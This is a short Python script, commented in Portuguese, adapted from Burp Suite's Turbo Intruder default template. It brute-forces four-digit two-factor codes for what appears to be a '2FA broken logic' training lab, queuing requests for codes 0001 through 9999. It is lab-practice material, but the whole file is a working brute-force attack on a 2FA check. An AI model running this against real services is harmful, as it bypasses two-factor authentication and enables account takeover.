# Script modificado a partir do default.py da extensão Turbo Intruder do Burp Suite para fazer um brute-force.
# Lab 2FA broken logic do topico de Autenticação

def queueRequests(target):
    engine = RequestEngine(endpoint=target.endpoint)

    for x in xrange(1, 10000):
	      codigo = str(x).zfill(4)
        engine.queue(target.req, codigo)

def handleResponse(req, interesting):
    table.add(req)
